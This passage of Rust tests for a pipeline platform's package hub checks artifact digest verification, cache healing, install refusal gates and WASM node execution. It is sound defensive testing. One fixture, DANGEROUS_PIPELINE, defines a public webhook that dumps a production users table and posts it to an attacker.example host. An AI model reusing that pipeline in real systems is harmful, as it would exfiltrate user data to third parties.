        let sha256 = sha256_hex(REFERENCED_MODULE);
        let path = referenced_artifact_path(root.path(), &sha256).expect("a valid digest");
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, REFERENCED_MODULE).unwrap();

        fetch_referenced_artifact(
            root.path(),
            "http://127.0.0.1:1/never-reached",
            "",
            "wasm/core.wasm",
            &HubPackageArtifactRef {
                sha256: sha256.clone(),
                media_type: "application/wasm".to_string(),
            },
            REFERENCED_MODULE.len(),
        )
        .await
        .expect("the cached bytes answer without a request");
    }

    /// A cached file at the right address with the wrong bytes is treated as
    /// absent, so a corrupted cache heals on the next fetch instead of refusing
    /// every install of that release forever.
    #[test]
    fn a_corrupted_cache_entry_does_not_count_as_cached() {
        let root = tempfile::tempdir().unwrap();
        let sha256 = sha256_hex(REFERENCED_MODULE);
        let path = referenced_artifact_path(root.path(), &sha256).expect("a valid digest");
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        let mut wrong = REFERENCED_MODULE.to_vec();
        wrong[0] ^= 0xff;
        std::fs::write(&path, &wrong).unwrap();

        assert!(!cached_artifact_matches(
            &path,
            REFERENCED_MODULE.len(),
            &sha256
        ));
        std::fs::write(&path, REFERENCED_MODULE).unwrap();
        assert!(cached_artifact_matches(
            &path,
            REFERENCED_MODULE.len(),
            &sha256
        ));
    }

    fn spec_of(document: &serde_json::Value) -> HubPackageSpec {
        serde_json::from_value(document["spec"].clone()).expect("package spec")
    }

    fn test_platform(root: &tempfile::TempDir) -> crate::platform::services::PlatformService {
        crate::platform::services::PlatformService::from_config(
            crate::platform::model::PlatformConfig {
                data_root: root.path().to_path_buf(),
                default_password: "test-password".to_string(),
                ..Default::default()
            },
        )
        .unwrap()
    }

    /// Writes a bundle document and, optionally, the artifact beside it.
    ///
    /// This is the local file channel exactly as the README describes it:
    /// `./artifacts/<sha256>` next to the document.
    fn write_local_channel(
        dir: &Path,
        document: &serde_json::Value,
        artifact: Option<(&str, &[u8])>,
    ) -> PathBuf {
        let document_path = dir.join("package.json");
        std::fs::write(&document_path, serde_json::to_vec(document).unwrap()).unwrap();
        if let Some((sha256, bytes)) = artifact {
            let artifact_dir = dir.join("artifacts");
            std::fs::create_dir_all(&artifact_dir).unwrap();
            std::fs::write(artifact_dir.join(sha256), bytes).unwrap();
        }
        document_path
    }

    /// The bytes are in the Hub store, addressed by the digest the package
    /// declares, and the install fetches and verifies them.
    #[test]
    fn a_referenced_artifact_installs_from_the_hub_store() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let owner = "superadmin";
        let project = "default";

        let sha256 = platform
            .hub
            .store_artifact(REFERENCED_MODULE)
            .expect("the store takes the module");
        assert_eq!(sha256, sha256_hex(REFERENCED_MODULE));

        let document = wasm_bundle_document(
            "storepkg",
            "Stored Package",
            referenced_module_entry(&sha256),
        );
        platform
            .hub
            .install_artifact_payload_from(
                owner.to_string(),
                project.to_string(),
                "storepkg",
                "1.0.0",
                "",
                "local/storepkg",
                spec_of(&document),
                &platform.hub.artifact_store(),
            )
            .expect("a verified artifact installs");

        let installed = root
            .path()
            .join("users/superadmin/default/data/nodes/storepkg/wasm/core.wasm");
        assert_eq!(
            std::fs::read(&installed).unwrap(),
            REFERENCED_MODULE,
            "the fetched bytes are the module, not a placeholder"
        );
        assert_eq!(
            platform
                .node_registry
                .get_by_kind(owner, project, "n.x.storepkg.train")
                .expect("the node is installed")
                .manifest
                .source,
            crate::platform::model::NodePackageSource::Wasm
        );
    }

    /// The same package, installed from a file with its artifact beside it.
    #[test]
    fn a_referenced_artifact_installs_from_a_document_on_disk() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let channel = tempfile::tempdir().unwrap();
        let owner = "superadmin";
        let project = "default";

        let sha256 = sha256_hex(REFERENCED_MODULE);
        let document =
            wasm_bundle_document("filepkg", "File Package", referenced_module_entry(&sha256));
        let document_path = write_local_channel(
            channel.path(),
            &document,
            Some((&sha256, REFERENCED_MODULE)),
        );

        let review = platform
            .hub
            .review_local_node_bundle_document(
                owner,
                project,
                "filepkg",
                "1.0.0",
                "",
                &document_path,
            )
            .expect("review succeeds");
        assert!(review.installable);

        platform
            .hub
            .install_local_node_bundle_document(
                owner,
                project,
                "filepkg",
                "1.0.0",
                "",
                &document_path,
            )
            .expect("an artifact beside the document installs");

        assert_eq!(
            std::fs::read(
                root.path()
                    .join("users/superadmin/default/data/nodes/filepkg/wasm/core.wasm")
            )
            .unwrap(),
            REFERENCED_MODULE
        );
        assert!(
            platform
                .node_registry
                .get_by_kind(owner, project, "n.x.filepkg.train")
                .is_some()
        );
    }

    /// Installing the carried form and the referenced form of one bundle lands
    /// identical bytes, so referencing is a transport decision and nothing else.
    #[test]
    fn a_carried_package_and_a_referenced_package_install_the_same_bytes() {
        let carried_root = tempfile::tempdir().unwrap();
        let carried = test_platform(&carried_root);
        let referenced_root = tempfile::tempdir().unwrap();
        let referenced = test_platform(&referenced_root);
        let owner = "superadmin";
        let project = "default";

        let carried_document =
            wasm_bundle_document("bothpkg", "Both Package", carried_module_entry());
        carried
            .hub
            .install_local_node_bundle(
                owner,
                project,
                "bothpkg",
                "1.0.0",
                "",
                carried_document.clone(),
            )
            .expect("a carried package installs exactly as before");

        let sha256 = referenced
            .hub
            .store_artifact(REFERENCED_MODULE)
            .expect("the store takes the module");
        let referenced_document =
            wasm_bundle_document("bothpkg", "Both Package", referenced_module_entry(&sha256));
        referenced
            .hub
            .install_artifact_payload_from(
                owner.to_string(),
                project.to_string(),
                "bothpkg",
                "1.0.0",
                "",
                "local/bothpkg",
                spec_of(&referenced_document),
                &referenced.hub.artifact_store(),
            )
            .expect("the referenced package installs");

        for rel in ["definition.json", "icon.svg", "wasm/core.wasm"] {
            let installed = format!("users/superadmin/default/data/nodes/bothpkg/{rel}");
            assert_eq!(
                std::fs::read(carried_root.path().join(&installed)).unwrap(),
                std::fs::read(referenced_root.path().join(&installed)).unwrap(),
                "'{rel}' must not depend on how its bytes travelled"
            );
        }
    }

    // ── The review reads what the install writes ────────────────────────
    //
    // A referenced entry's bytes live on the channel, so a review that does not
    // fetch them scans an empty string. These prove that how a pipeline
    // travelled never changes the verdict it gets.

    /// A pipeline worth refusing: a public webhook that reads a credentialed
    /// database and posts the result to somebody else's host.
    const DANGEROUS_PIPELINE: &str = r#"{
        "apiVersion": "zebflow.com/v1",
        "kind": "Pipeline",
        "metadata": { "name": "exfiltrate" },
        "spec": {
            "nodes": [
                { "id": "t1", "kind": "n.trigger.webhook",
                  "config": { "path": "/public/exfiltrate", "method": "POST" } },
                { "id": "n1", "kind": "n.db.query",
                  "config": { "credential": "prod-postgres", "query": "select * from users" } },
                { "id": "n2", "kind": "n.http.request",
                  "config": { "url": "https://attacker.example/collect" } }
            ]
        }
    }"#;

    /// One pipeline package whose single entry is supplied by the caller, so
    /// the carried and referenced forms differ in nothing else.
    fn pipeline_package(asset_kind: &str, entry: serde_json::Value) -> HubPackageSpec {
        serde_json::from_value(serde_json::json!({
            "asset_kind": asset_kind,
            "title": "Exfiltrator",
            "description": "A package whose pipeline may travel beside the document.",
            "files": [entry]
        }))
        .expect("package spec")
    }

    fn carried_pipeline_entry() -> serde_json::Value {
        serde_json::json!({
            "rel_path": "pipelines/exfiltrate.zf.json", "kind": "pipeline",
            "size_bytes": DANGEROUS_PIPELINE.len(), "reason": "test",
            "content": DANGEROUS_PIPELINE
        })
    }

    fn referenced_pipeline_entry(sha256: &str) -> serde_json::Value {
        serde_json::json!({
            "rel_path": "pipelines/exfiltrate.zf.json", "kind": "pipeline",
            "size_bytes": DANGEROUS_PIPELINE.len(), "reason": "test",
            "artifact": { "sha256": sha256, "media_type": "application/json" }
        })
    }

    /// Installing a project bundle registers its pipelines, runs the schema and
    /// seed data it carries, and activates what it names. A bundle whose
    /// pipeline the review cannot read must be refused before any of that, and
    /// before the project it would fill is created.
    #[test]
    fn a_project_bundle_the_review_cannot_read_is_refused() {
        let package = pipeline_package(
            HUB_ASSET_KIND_PROJECT_BUNDLE,
            referenced_pipeline_entry(&sha256_hex(DANGEROUS_PIPELINE.as_bytes())),
        );

        let error = refuse_unreviewable_project_bundle(&review_project_bundle_entries(
            &ResolvedProjectLayout::platform_default(),
            &package.files,
            &no_channel(),
        ))
        .expect_err("a bundle the review cannot read must not install");

        assert_eq!(error.code, "HUB_REMOTE_INSTALL_REFUSED");
        assert!(
            error.message.contains("pipelines/exfiltrate.zf.json"),
            "the refusal names the entry it could not read: {}",
            error.message
        );
    }

    /// The honest limit of this gate. It refuses what cannot be read, not what
    /// is hostile: the same pipeline carried inline parses, so it passes, even
    /// though the review reports a public webhook reading a credentialed
    /// database and posting elsewhere. Content detectors that produce
    /// violations do not exist yet, and this test fails the day one does --
    /// which is the point.
    #[test]
    fn a_readable_project_bundle_passes_however_hostile_it_is() {
        let package = pipeline_package(HUB_ASSET_KIND_PROJECT_BUNDLE, carried_pipeline_entry());

        refuse_unreviewable_project_bundle(&review_project_bundle_entries(
            &ResolvedProjectLayout::platform_default(),
            &package.files,
            &no_channel(),
        ))
        .expect("a readable bundle is not refused by this gate today");
    }

    /// A shell script put to both install gates.
    ///
    /// They are separate functions reached on separate paths -- one decides
    /// about a project bundle before the project it fills exists, the other
    /// about prepared bytes already on their way to disk -- so what this test
    /// is for is that they answer the same way, not that either answers.
    #[test]
    fn both_install_gates_refuse_a_file_type_no_project_accepts() {
        let layout = ResolvedProjectLayout::platform_default();
        let rel = "pipelines/hub/pkg/postinstall.sh";
        let package = pipeline_package(
            HUB_ASSET_KIND_PROJECT_BUNDLE,
            serde_json::json!({
                "rel_path": rel, "kind": "file",
                "size_bytes": 5, "reason": "test", "content": "true\n"
            }),
        );

        let bundle_error = refuse_unreviewable_project_bundle(&review_project_bundle_entries(
            &layout,
            &package.files,
            &no_channel(),
        ))
        .expect_err("a bundle carrying a shell script must not install");

        let prepared = vec![PreparedHubInstallEntry {
            install_rel: rel.to_string(),
            destination: PathBuf::from(rel),
            bytes: b"true\n".to_vec(),
            previous: None,
        }];
        let prepared_error =
            refuse_prepared_install_violations(&layout, HUB_ASSET_KIND_PIPELINE_BUNDLE, &prepared)
                .expect_err("the same script must not reach disk either");

        assert_eq!(bundle_error.code, "HUB_REMOTE_INSTALL_REFUSED");
        assert_eq!(prepared_error.code, "HUB_INSTALL_REFUSED");
        for error in [&bundle_error, &prepared_error] {
            assert!(
                error.message.contains(rel) && error.message.contains("'.sh'"),
                "the refusal names the path and the extension: {}",
                error.message
            );
        }
    }

    /// The same package with the same script renamed to a page: both gates let
    /// it through, so the rule is the extension and not the folder it is in.
    #[test]
    fn both_install_gates_accept_ordinary_source() {
        let layout = ResolvedProjectLayout::platform_default();
        let rel = "pipelines/hub/pkg/postinstall.tsx";
        let package = pipeline_package(
            HUB_ASSET_KIND_PROJECT_BUNDLE,
            serde_json::json!({
                "rel_path": rel, "kind": "tsx",
                "size_bytes": 5, "reason": "test", "content": "true\n"
            }),
        );

        refuse_unreviewable_project_bundle(&review_project_bundle_entries(
            &layout,
            &package.files,
            &no_channel(),
        ))
        .expect("ordinary source is not refused");
        refuse_prepared_install_violations(
            &layout,
            HUB_ASSET_KIND_PIPELINE_BUNDLE,
            &[PreparedHubInstallEntry {
                install_rel: rel.to_string(),
                destination: PathBuf::from(rel),
                bytes: b"true\n".to_vec(),
                previous: None,
            }],
        )
        .expect("ordinary source is not refused");
    }

    /// Bytes at a pipeline path that are not text at all.
    ///
    /// A manifest carries them base64, because a JSON string cannot hold them;
    /// a prepared install holds the same bytes directly. That difference is the
    /// whole reason the gates could disagree about them.
    const NOT_TEXT_PIPELINE: &[u8] = &[0x1f, 0x8b, 0x08, 0x00, 0xff, 0xfe, 0x00, 0x01];

    fn not_text_entry(rel_path: &str) -> serde_json::Value {
        serde_json::json!({
            "rel_path": rel_path, "kind": "pipeline",
            "size_bytes": NOT_TEXT_PIPELINE.len(), "reason": "test",
            "encoding": "base64",
            "content": base64::engine::general_purpose::STANDARD.encode(NOT_TEXT_PIPELINE)
        })
    }

    fn prepared_entry(rel_path: &str, bytes: &[u8]) -> PreparedHubInstallEntry {
        PreparedHubInstallEntry {
            install_rel: rel_path.to_string(),
            destination: PathBuf::from(rel_path),
            bytes: bytes.to_vec(),
            previous: None,
        }
    }

    /// A node bundle declaring one node whose function pipeline is an entry of
    /// its own, which is how a file outside the repository's pipeline directory
    /// becomes a pipeline to the review.
    fn bundle_definition_document() -> String {
        serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "NodeBundle",
            "metadata": { "name": "acme", "version": "1.0.0" },
            "spec": {
                "package": "acme",
                "version": "1.0.0",
                "title": "Acme",
                "description": "A bundle whose function pipeline travels with it.",
                "functions": { "main": "functions/main.zf.json" },
                "nodes": [{
                    "kind": "n.x.acme.sync",
                    "title": "Sync",
                    "description": "Push a payload somewhere.",
                    "run": { "function": "main" },
                    "definition": {
                        "input_pins": ["in"],
                        "output_pins": ["out"],
                        "config_schema": {},
                        "input_schema": { "type": "object" },
                        "output_schema": { "type": "object" }
                    }
                }]
            }
        })
        .to_string()
    }

    /// One document at all three refusals: publish, the project-bundle gate,
    /// and the prepared-install gate every channel passes through. The bytes
    /// are the same bytes at a path all three read as a pipeline, so the answer
    /// has to be the same answer. The prepared gate used to call this an empty
    /// pipeline and install it.
    #[test]
    fn all_three_gates_refuse_the_same_pipeline_none_of_them_can_read() {
        let layout = ResolvedProjectLayout::platform_default();
        let rel = "pipelines/exfiltrate.zf.json";
        let package = pipeline_package(HUB_ASSET_KIND_PIPELINE_BUNDLE, not_text_entry(rel));

        let publish_error = refuse_publish_violations(
            "HUB_PUBLISH_REFUSED",
            &review_publish_entries(
                &layout,
                HUB_ASSET_KIND_PIPELINE_BUNDLE,
                &package.files,
                Vec::new(),
                "Exfiltrator",
                "A pipeline whose bytes are not text.",
                true,
                &no_channel(),
            ),
        )
        .expect_err("a release no install would accept must not be published");

        let bundle_error = refuse_unreviewable_project_bundle(&review_project_bundle_entries(
            &layout,
            &package.files,
            &no_channel(),
        ))
        .expect_err("a bundle whose pipeline cannot be read must not install");

        let prepared_error = refuse_prepared_install_violations(
            &layout,
            HUB_ASSET_KIND_PIPELINE_BUNDLE,
            &[prepared_entry(rel, NOT_TEXT_PIPELINE)],
        )
        .expect_err("the same bytes must not reach disk either");

        assert_eq!(publish_error.code, "HUB_PUBLISH_REFUSED");
        assert_eq!(bundle_error.code, "HUB_REMOTE_INSTALL_REFUSED");
        assert_eq!(prepared_error.code, "HUB_INSTALL_REFUSED");
        for error in [&publish_error, &bundle_error, &prepared_error] {
            assert!(
                error.message.contains(rel)
                    && error
                        .message
                        .contains("a pipeline the safety review cannot read"),
                "every gate reports the same finding: {}",
                error.message
            );
        }
    }

    /// The constraint that shaped the gate that was wrong. Bytes that are not
    /// text are a refusal only where the review was going to read them: an icon
    /// is binary at every gate and installs at every gate.
    #[test]
    fn all_three_gates_accept_a_binary_that_is_not_at_a_pipeline_path() {
        let layout = ResolvedProjectLayout::platform_default();
        let icon = [0x89u8, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
        let rel = format!("{}/icon.png", layout.assets);
        let package = pipeline_package(
            HUB_ASSET_KIND_PIPELINE_BUNDLE,
            serde_json::json!({
                "rel_path": rel, "kind": "asset",
                "size_bytes": icon.len(), "reason": "test",
                "encoding": "base64",
                "content": base64::engine::general_purpose::STANDARD.encode(icon)
            }),
        );

        refuse_publish_violations(
            "HUB_PUBLISH_REFUSED",
            &review_publish_entries(
                &layout,
                HUB_ASSET_KIND_PIPELINE_BUNDLE,
                &package.files,
                Vec::new(),
                "Icon",
                "A package carrying an image.",
                true,
                &no_channel(),
            ),
        )
        .expect("an image is publishable");
        refuse_unreviewable_project_bundle(&review_project_bundle_entries(
            &layout,
            &package.files,
            &no_channel(),
        ))
        .expect("an image is installable");
        refuse_prepared_install_violations(
            &layout,
            HUB_ASSET_KIND_PIPELINE_BUNDLE,
            &[prepared_entry(&rel, &icon)],
        )
        .expect("an image is installable");
    }

    /// What runs before the prepared gate, and how far it reaches.
    ///
    /// `validate_prepared_pipeline_sources` decodes every entry the *layout*
    /// calls a pipeline, so for a repository pipeline path it refuses these
    /// bytes first and the gate behind it never speaks. Both refuse, with
    /// different codes and the same outcome -- which is why the divergence went
    /// unnoticed on this path.
    #[test]
    fn a_repository_pipeline_that_is_not_text_is_refused_before_the_gate_sees_it() {
        let layout = ResolvedProjectLayout::platform_default();
        let prepared = [prepared_entry(
            "pipelines/exfiltrate.zf.json",
            NOT_TEXT_PIPELINE,
        )];

        let validator_error = validate_prepared_pipeline_sources(&layout, &prepared)
            .expect_err("bytes that will not decode are not a pipeline");
        assert_eq!(validator_error.code, "HUB_INSTALL");

        let gate_error =
            refuse_prepared_install_violations(&layout, HUB_ASSET_KIND_PIPELINE_BUNDLE, &prepared)
                .expect_err("the gate behind it must not disagree");
        assert_eq!(gate_error.code, "HUB_INSTALL_REFUSED");
    }

    /// And where it does not reach. A node bundle's function pipeline is a
    /// pipeline to the review -- the bundle's own manifest says so -- and not a
    /// pipeline to the layout, which knows only the repository's source root.
    /// The validator passes it, so the gate is the only thing between these
    /// bytes and disk, and until it read them the same way the others do it let
    /// them through as an empty pipeline.
    #[test]
    fn a_bundle_function_pipeline_that_is_not_text_reaches_only_the_prepared_gate() {
        let layout = ResolvedProjectLayout::platform_default();
        let definition = bundle_definition_document();
        let function_rel = "hub/acme/functions/main.zf.json";
        let prepared = [
            prepared_entry("hub/acme/definition.json", definition.as_bytes()),
            prepared_entry(function_rel, NOT_TEXT_PIPELINE),
        ];

        validate_prepared_pipeline_sources(&layout, &prepared)
            .expect("a bundle's own function pipeline is not a repository pipeline path");

        let error =
            refuse_prepared_install_violations(&layout, HUB_ASSET_KIND_NODE_BUNDLE, &prepared)
                .expect_err("a function pipeline the review cannot read must not install");
        assert_eq!(error.code, "HUB_INSTALL_REFUSED");
        assert!(
            error.message.contains(function_rel)
                && error
                    .message
                    .contains("a pipeline the safety review cannot read"),
            "the refusal names the function pipeline: {}",
            error.message
        );
    }

    /// The same pipeline, carried and referenced, reviewed through a channel
    /// that holds it: one verdict, because a transport decision is not a safety
    /// decision.
    #[test]
    fn a_referenced_pipeline_reviews_exactly_as_the_carried_one_does() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let sha256 = platform
            .hub
            .store_artifact(DANGEROUS_PIPELINE.as_bytes())
            .expect("the store takes the pipeline");

        let review_of = |entry: serde_json::Value| {
            platform
                .hub
                .review_artifact_payload(
                    "superadmin",
                    "default",
                    "exfilpkg",
                    "1.0.0",
                    "",
                    &pipeline_package(HUB_ASSET_KIND_PIPELINE_BUNDLE, entry),
                    &platform.hub.artifact_store(),
                )
                .expect("the review runs")
        };

        let carried = review_of(carried_pipeline_entry());
        let referenced = review_of(referenced_pipeline_entry(&sha256));

        assert!(
            carried
                .public_endpoints
                .contains(&"/public/exfiltrate".to_string()),
            "the carried form is the control and must see the endpoint"
        );
        assert_eq!(
            serde_json::to_value(&referenced).unwrap(),
            serde_json::to_value(&carried).unwrap(),
            "how the bytes travelled must not change a single reviewed fact"
        );
    }

    /// A channel with nowhere to look does not clear the package: the review
    /// says it cannot read the pipeline, which is a refusal and not a pass.
    #[test]
    fn a_pipeline_the_channel_cannot_resolve_blocks_the_review() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let sha256 = sha256_hex(DANGEROUS_PIPELINE.as_bytes());

        let review = platform
            .hub
            .review_artifact_payload(
                "superadmin",
                "default",
                "exfilpkg",
                "1.0.0",
                "",
                &pipeline_package(
                    HUB_ASSET_KIND_PIPELINE_BUNDLE,
                    referenced_pipeline_entry(&sha256),
                ),
                &no_channel(),
            )
            .expect("the review runs");

        assert!(
            !review.installable && review.risk_level == "blocked",
            "an unreadable pipeline must block, not pass: {review:?}"
        );
        assert!(
            review
                .violations
                .iter()
                .any(|item| item.starts_with("pipelines/hub/exfilpkg/exfiltrate.zf.json:")),
            "the violation names the destination the install would write: {:?}",
            review.violations
        );
        assert!(
            review.nodes_used.is_empty() && review.public_endpoints.is_empty(),
            "nothing may be reported as reviewed when nothing could be read"
        );
    }

    /// The refusal lands before the install writes, so a package it cannot
    /// review leaves the project exactly as it found it.
    #[test]
    fn an_unreadable_pipeline_refuses_the_install_before_anything_is_written() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let sha256 = sha256_hex(DANGEROUS_PIPELINE.as_bytes());
        let document = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "HubPackage",
            "metadata": { "name": "exfilpkg", "version": "1.0.0" },
            "spec": serde_json::to_value(pipeline_package(
                HUB_ASSET_KIND_NODE_BUNDLE,
                referenced_pipeline_entry(&sha256),
            ))
            .unwrap()
        });

        let error = platform
            .hub
            .install_local_node_bundle(
                "superadmin",
                "default",
                "exfilpkg",
                "1.0.0",
                "pipelines/hub/exfilpkg",
                document,
            )
            .expect_err("a package the review cannot read must not install");
        assert_eq!(error.code, "NODE_BUNDLE_INSTALL_REFUSED");
        assert!(
            !root
                .path()
                .join("users/superadmin/default/data/pipelines/hub/exfilpkg")
                .exists(),
            "the refusal must precede every write"
        );
    }

    /// Installs the carried bundle, then returns everything a refused second
    /// install must leave exactly as it found it.
    fn install_previous_state(
        root: &tempfile::TempDir,
        platform: &crate::platform::services::PlatformService,
        package_id: &str,
    ) -> (
        Vec<u8>,
        Vec<u8>,
        crate::contracts::kinds::DependencyLockSpec,
    ) {
        let document =
            wasm_bundle_document(package_id, "Installed Package", carried_module_entry());
        platform
            .hub
            .install_local_node_bundle("superadmin", "default", package_id, "1.0.0", "", document)
            .expect("the first install succeeds");
        let package_dir = root
            .path()
            .join(format!("users/superadmin/default/data/nodes/{package_id}"));
        (
            std::fs::read(package_dir.join("definition.json")).unwrap(),
            std::fs::read(package_dir.join("wasm/core.wasm")).unwrap(),
            platform
                .dependency_lock
                .read("superadmin", "default")
                .unwrap(),
        )
    }

    fn assert_previous_state(
        root: &tempfile::TempDir,
        platform: &crate::platform::services::PlatformService,
        package_id: &str,
        previous: (
            Vec<u8>,
            Vec<u8>,
            crate::contracts::kinds::DependencyLockSpec,
        ),
    ) {
        let package_dir = root
            .path()
            .join(format!("users/superadmin/default/data/nodes/{package_id}"));
        assert_eq!(
            std::fs::read(package_dir.join("definition.json")).unwrap(),
            previous.0,
            "the refused install must not have rewritten the definition"
        );
        assert_eq!(
            std::fs::read(package_dir.join("wasm/core.wasm")).unwrap(),
            previous.1,
            "the refused install must not have rewritten the module"
        );
        assert_eq!(
            platform
                .dependency_lock
                .read("superadmin", "default")
                .unwrap(),
            previous.2,
            "the lock still describes what is actually installed"
        );
        assert!(
            platform
                .node_registry
                .get_by_kind("superadmin", "default", &format!("n.x.{package_id}.train"))
                .is_some(),
            "the previously installed node still resolves"
        );
    }

    /// Bytes that hash to something else are not the bytes the package named,
    /// so the install refuses and the previous release stays in place.
    #[test]
    fn a_digest_mismatch_refuses_the_install_and_leaves_the_previous_state() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let channel = tempfile::tempdir().unwrap();
        let previous = install_previous_state(&root, &platform, "tamperpkg");

        // The document names the real module's digest; the file sitting at that
        // address is something else, which is what tampering looks like.
        let sha256 = sha256_hex(REFERENCED_MODULE);
        let document = wasm_bundle_document(
            "tamperpkg",
            "Tampered Package",
            referenced_module_entry(&sha256),
        );
        let mut tampered = REFERENCED_MODULE.to_vec();
        *tampered.last_mut().unwrap() ^= 0xff;
        let document_path =
            write_local_channel(channel.path(), &document, Some((&sha256, &tampered)));

        let error = platform
            .hub
            .install_local_node_bundle_document(
                "superadmin",
                "default",
                "tamperpkg",
                "1.0.0",
                "",
                &document_path,
            )
            .expect_err("a digest mismatch must refuse the install");
        assert_eq!(error.code, "HUB_ARTIFACT_DIGEST_MISMATCH");
        assert_previous_state(&root, &platform, "tamperpkg", previous);
    }

    /// A reference the channel cannot answer is a failed fetch, and a failed
    /// fetch leaves the previous state intact.
    #[test]
    fn a_missing_artifact_refuses_the_install_and_leaves_the_previous_state() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let channel = tempfile::tempdir().unwrap();
        let previous = install_previous_state(&root, &platform, "missingpkg");

        let document = wasm_bundle_document(
            "missingpkg",
            "Missing Package",
            referenced_module_entry(&sha256_hex(REFERENCED_MODULE)),
        );
        let document_path = write_local_channel(channel.path(), &document, None);

        let error = platform
            .hub
            .install_local_node_bundle_document(
                "superadmin",
                "default",
                "missingpkg",
                "1.0.0",
                "",
                &document_path,
            )
            .expect_err("a missing artifact must refuse the install");
        assert_eq!(error.code, "HUB_ARTIFACT_MISSING");
        assert_previous_state(&root, &platform, "missingpkg", previous);
    }

    /// A document posted as a body says nothing about where its artifacts live,
    /// so that channel refuses a reference rather than writing an empty file.
    #[test]
    fn a_channel_without_a_location_refuses_a_referenced_artifact() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let document = wasm_bundle_document(
            "bodypkg",
            "Body Package",
            referenced_module_entry(&sha256_hex(REFERENCED_MODULE)),
        );

        let error = platform
            .hub
            .install_local_node_bundle("superadmin", "default", "bodypkg", "1.0.0", "", document)
            .expect_err("a channel with no location must refuse");
        assert_eq!(error.code, "HUB_ARTIFACT_UNRESOLVED");
        assert!(
            !root
                .path()
                .join("users/superadmin/default/data/nodes/bodypkg")
                .exists(),
            "a refused install writes nothing at all"
        );
    }

    /// A trigger's inbound handler is its run binding, so a WASM trigger runs
    /// the same way a WASM action does.
    ///
    /// This is the runtime half of separating role from implementation: before
    /// the run binding existed, a trigger could only be composite.
    #[tokio::test]
    async fn a_wasm_trigger_runs_its_handler_export() {
        use base64::Engine as _;

        let root = tempfile::tempdir().unwrap();
        let platform = std::sync::Arc::new(
            crate::platform::services::PlatformService::from_config(
                crate::platform::model::PlatformConfig {
                    data_root: root.path().to_path_buf(),
                    default_password: "test-password".to_string(),
                    ..Default::default()
                },
            )
            .unwrap(),
        );
        let owner = "superadmin";
        let project = "default";

        let module =
            include_bytes!("../../../tests/fixtures/contracts/node-bundle/two-exports.wasm");
        let mut trigger = wasm_node_entry("n.x.wasmtrig.inbox", "Inbox", "e2e_train");
        trigger["trigger"] = serde_json::json!({
            "type": "webhook",
            "path_template": "/wasmtrig/{{ hook_key }}"
        });
        trigger["definition"]["input_pins"] = serde_json::json!([]);
        trigger["definition"]["config_schema"] = serde_json::json!({
            "type": "object",
            "properties": { "hook_key": { "type": "string" } }
        });
        trigger["definition"]["fields"] = serde_json::json!([{
            "name": "hook_key",
            "label": "Hook Key",
            "type": "text",
            "help": "Key used to build the public webhook path."
        }]);

        let definition = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "NodeBundle",
            "metadata": { "name": "wasmtrig", "version": "1.0.0" },
            "spec": {
                "package": "wasmtrig",
                "version": "1.0.0",
                "title": "WASM Trigger",
                "description": "A trigger whose inbound handler is a WASM export.",
                "icon": "icon.svg",
                "credentials": [],
                "functions": {},
                "modules": {
                    "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                },
                "nodes": [trigger]
            }
        })
        .to_string();
        let icon = "<svg xmlns=\"http://www.w3.org/2000/svg\"/>";

        let payload: HubPackageSpec = serde_json::from_value(serde_json::json!({
            "asset_kind": "node_bundle",
            "title": "WASM Trigger",
            "description": "Exercises a WASM trigger handler.",
            "files": [
                { "rel_path": "definition.json", "kind": "node_definition",
                  "size_bytes": definition.len(), "reason": "test", "content": definition },
                { "rel_path": "icon.svg", "kind": "asset",
                  "size_bytes": icon.len(), "reason": "test", "content": icon },
                { "rel_path": "wasm/core.wasm", "kind": "asset",
                  "size_bytes": module.len(), "reason": "test", "encoding": "base64",
                  "content": base64::engine::general_purpose::STANDARD.encode(module) }
            ]
        }))
        .unwrap();

        platform
            .hub
            .install_artifact_payload_from(
                owner.to_string(),
                project.to_string(),
                "wasmtrig",
                "1.0.0",
                "",
                "test/wasmtrig",
                payload,
                &no_channel(),
            )
            .expect("install succeeds");

        let installed = platform
            .node_registry
            .get_by_kind(owner, project, "n.x.wasmtrig.inbox")
            .expect("trigger is installed");
        assert!(
            installed.manifest.trigger.is_some(),
            "the node keeps its trigger role"
        );
        assert_eq!(
            installed.manifest.source,
            crate::platform::model::NodePackageSource::Wasm,
            "and its implementation is WASM"
        );

        // The engine routes a trigger through its run binding, so the handler
        // export is what actually processes the inbound event.
        let (module_spec, export) = installed.manifest.wasm_target().expect("wasm target");
        let output = crate::pipeline::engines::wasm_host::run_wasm_export(
            "n.x.wasmtrig.inbox",
            &installed.package_dir,
            module_spec,
            export,
            &serde_json::json!({ "hook_key": "abc" }),
            &serde_json::json!({ "update_id": 7 }),
            &serde_json::json!({ "owner": owner, "project": project }),
        )
        .expect("handler runs");
        assert_eq!(output["ok"], serde_json::json!(true));
        assert_eq!(output["export"], serde_json::json!("e2e_train"));
    }

    /// Installs a real WASM bundle whose two nodes share one module through
    /// distinct exports, then runs both.
    ///
    /// This is the regression guard for the entry-point collision: before the
    /// run binding existed, every WASM node in a package resolved to the same
    /// default export.
    #[tokio::test]
    async fn installed_wasm_nodes_execute_their_own_exports() {
        use base64::Engine as _;

        let root = tempfile::tempdir().unwrap();
        let platform = std::sync::Arc::new(
            crate::platform::services::PlatformService::from_config(
                crate::platform::model::PlatformConfig {
                    data_root: root.path().to_path_buf(),
                    default_password: "test-password".to_string(),
                    ..Default::default()
                },
            )
            .unwrap(),
        );
        let owner = "superadmin";
        let project = "default";

        let module =
            include_bytes!("../../../tests/fixtures/contracts/node-bundle/two-exports.wasm");
        let definition = serde_json::json!({
